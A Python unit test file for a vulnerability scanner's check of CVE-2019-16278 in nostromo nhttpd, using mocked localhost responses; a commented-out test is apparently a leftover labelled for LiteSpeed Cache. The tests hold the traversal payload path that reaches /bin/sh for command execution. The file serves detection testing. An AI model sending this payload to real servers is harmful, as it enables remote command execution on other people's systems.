"""Unit tests for Agent Asteroid: CVE-2019-16278"""

import requests_mock as req_mock

from agent import definitions
from agent.exploits import cve_2019_16278


def testCVE201916278_whenVulnerable_reportFinding(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2019-16278 unit test: case when target is vulnerable."""
    requests_mock.get(
        url="http://localhost:80/",
        status_code=200,
        headers={"Server": "nostromo 1.9.4"},
    )
    requests_mock.post(
        "http://localhost:80/.%0D./.%0D./.%0D./.%0D./bin/sh",
        text="uid=65534 gid=65534",
        status_code=200,
    )
    exploit_instance = cve_2019_16278.CVE201916278Exploit()
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    vulnerability = vulnerabilities[0]
    assert (
        vulnerability.entry.title == "NOSTROMO NHTTPD DIRECTORY TRAVERSAL VULNERABILITY"
    )
    assert vulnerability.technical_detail == (
        "http://localhost:80 is vulnerable to CVE-2019-16278, NOSTROMO NHTTPD DIRECTORY TRAVERSAL VULNERABILITY"
    )


def testCVE201916278_whenSafe_reportNothing(
    requests_mock: req_mock.mocker.Mocker,
) -> None:
    """CVE-2019-16278 unit test: case when target is safe."""
    exploit_instance = cve_2019_16278.CVE201916278Exploit()
    requests_mock.get(
        url="http://localhost:80/",
        status_code=200,
        headers={"Server": "nostromo 1.9.4"},
    )
    requests_mock.post(
        "http://localhost:80/.%0D./.%0D./.%0D./.%0D./bin/sh",
        status_code=404,
    )
    target = definitions.Target("http", "localhost", 80)

    accept = exploit_instance.accept(target)
    vulnerabilities = exploit_instance.check(target)

    assert accept is True
    assert len(vulnerabilities) == 0


# def testCVE201916278_whenTargetNotLiteSpeedCache_reportNothing(
#     requests_mock: req_mock.mocker.Mocker,
# ) -> None:
#     """CVE-2019-16278 unit test: case when target is safe."""
#     exploit_instance = cve_2019_16278.CVE201916278Exploit()
#     requests_mock.get(
#         "http://localhost:80/wp-content/plugins/litespeed-cache/readme.txt",
#         text="""Not Found""",
#         status_code=404,
#     )
#     target = definitions.Target("http", "localhost", 80)
#
#     accept = exploit_instance.accept(target)
#     vulnerabilities = exploit_instance.check(target)
#
#     assert accept is False
#     assert len(vulnerabilities) == 0
